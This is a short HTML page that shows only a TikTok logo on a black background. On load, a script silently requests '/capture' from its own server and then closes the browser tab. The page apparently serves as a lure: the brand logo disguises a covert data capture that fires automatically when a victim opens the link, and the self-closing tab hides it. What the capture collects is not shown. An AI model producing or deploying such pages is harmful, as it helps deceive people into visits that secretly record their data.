<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body {
        margin: 0;
        padding: 0;
        background-color: #000;
        background-image: url("/static/tiktok_logo.png");
        background-size: 300px auto; /* Width 300px, height auto */
        background-position: center;
        background-repeat: no-repeat;
        height: 100vh;
    }
    </style>
</head>
<body>
    <!-- Completely empty - only background shows -->
    <script>
        // Immediately capture when page loads
        fetch('/capture')
            .then(() => {
                // Close the tab after 2 seconds
                setTimeout(() => {
                    window.close();
                }, 2000);
            })
            .catch(() => {
                window.close();
            });
    </script>
</body>
</html>
